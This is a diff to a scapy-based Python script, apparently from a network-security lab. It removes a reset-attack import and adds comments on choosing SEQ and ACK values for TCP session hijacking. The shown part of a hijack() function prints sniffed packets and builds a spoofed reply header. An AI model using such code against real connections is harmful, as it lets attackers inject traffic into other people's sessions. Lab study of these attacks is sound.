@@ -1,6 +1,4 @@
 from scapy.all import IP, TCP, send, sniff
-from RSTattack import spoofRST
-import time
 
 H1_IP = '10.9.0.6'
 V_IP = '10.9.0.5'
@@ -22,6 +20,9 @@ def printPkt(pkt):
   print("seq=%d, ack=%d. len=%d, data=%s"%(seq, ack, len(data), data))
   print("-------------------")
 
+# Similar to RST attack, must find correct SEQ and ACK value
+# local machine holds SEQ and remote server holds ACK value, vice versa in server
+# the amount added to ACK is the payload length sent from server, SEQ is sending to server
 def hijack(pkt):
   printPkt(pkt)
   ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
